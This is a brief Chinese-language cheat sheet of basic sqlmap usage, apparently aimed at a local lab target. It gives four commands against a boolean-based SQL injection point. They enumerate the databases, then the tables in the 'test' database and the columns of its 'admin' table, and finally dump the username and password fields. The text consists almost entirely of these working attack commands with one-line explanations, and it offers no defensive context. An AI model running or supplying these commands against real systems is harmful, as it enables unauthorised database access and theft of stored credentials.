
# 基本用法

### 获取数据库基本信息

sqlmap -u "http://192.168.22.180/boolean.php?id=1"  --dbms mysql --level 3 --dbs

查询有哪些数据库

sqlmap -u "http://192.168.22.180/boolean.php?id=1"  --dbms mysql --level 3 -D test --tables

查询test数据库中有哪些表

sqlmap -u "http://192.168.22.180/boolean.php?id=1"  --dbms mysql --level 3 -D test -T admin --columns

查询test数据库中admin表有哪些字段

sqlmap -u "http://192.168.22.180/boolean.php?id=1"  --dbms mysql --level 3 -D test -T admin -C "username,password" --dump

dump出字段username与password中的数据

